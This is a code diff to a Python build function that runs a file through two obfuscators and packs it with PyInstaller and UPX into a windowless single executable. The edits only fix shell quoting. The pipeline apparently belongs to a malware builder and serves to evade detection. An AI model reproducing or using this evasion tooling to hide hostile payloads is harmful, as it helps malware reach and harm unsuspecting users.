@@ -208,7 +208,7 @@ def _makebuild(q: Queue, data_builder) -> str:
     rosefub = os.path.join(path, 'obf2-rose.py')
     blankobf = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'blankobf.py')
     pycloak = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'obfuscation', 'pycloak-main')
-    rvenv = f"\'{os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')}\'"
+    rvenv = os.path.join(Path(__file__).resolve().parent.parent.parent, 'rosevenv', 'Scripts', 'activate')
     final = 'dist\\Built.exe'
     post = os.path.join(Path(__file__).resolve().parent.parent, 'utils', 'comp', 'post.py')
         
@@ -283,13 +283,13 @@ def _makebuild(q: Queue, data_builder) -> str:
             logger.info("Entering obfuscate")
             try:
                 logger.info("Entering obfuscate process")
-                obf1 = f'call {rvenv} && python "{blankobf}" -o "{rosefu}" "{rosef}"'
+                obf1 = f'call \"{rvenv}\" && python \"{blankobf}\" -o \"{rosefu}\" \"{rosef}\"'
                 logger.info(obf1)
                 subprocess.call(obf1, shell=True, stderr=subprocess.STDOUT)
-                install = f'call {rvenv} && cd "{pycloak}" && pip install .'
+                install = f'call \"{rvenv}\" && cd \"{pycloak}" && pip install .'
                 logger.info(install)
                 subprocess.call(install, shell=True, stderr=subprocess.STDOUT)
-                obf2 = f'call {rvenv} && pycloak -o "{rosefub}" -d "{rosefu}"'
+                obf2 = f'call \"{rvenv}\" && pycloak -o \"{rosefub}\" -d \"{rosefu}\"'
                 logger.info(obf2)
                 subprocess.call(obf2, shell=True, stderr=subprocess.STDOUT)
                 os.remove(rosefu)
@@ -399,7 +399,7 @@ def _makebuild(q: Queue, data_builder) -> str:
         himports = [item for item in himports if item]
         
         imports = " ".join(["--hidden-import=" + module for module in himports])
-        compile_line = f'call {rvenv} && pyinstaller "{rosefub if data_builder["obfuscation"] else rosef}" --clean --name="Built" --upx-dir="{upx_dir}" --noconsole --onefile {imports}'
+        compile_line = f'call \"{rvenv}\" && pyinstaller \"{rosefub if data_builder["obfuscation"] else rosef}\" --clean --name=\"Built\" --upx-dir=\"{upx_dir}\" --noconsole --onefile {imports}'
         try:
             logger.info("Entering python compile process")
             logger.info(f'Python Compile CMD Line: {compile_line}')
@@ -411,7 +411,7 @@ def _makebuild(q: Queue, data_builder) -> str:
                 stderr=subprocess.STDOUT
             )
             logger.info(f"Output of Python compile process saved in rosecompile.log")
-            subprocess.call(f'call {rvenv} && python "{post}" dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
+            subprocess.call(f'call \"{rvenv}\" && python \"{post}\" dist/Built.exe', shell=True, stderr=subprocess.STDOUT)
         except Exception as e:
             logger.error(f"Error in py compile: {e}")
 
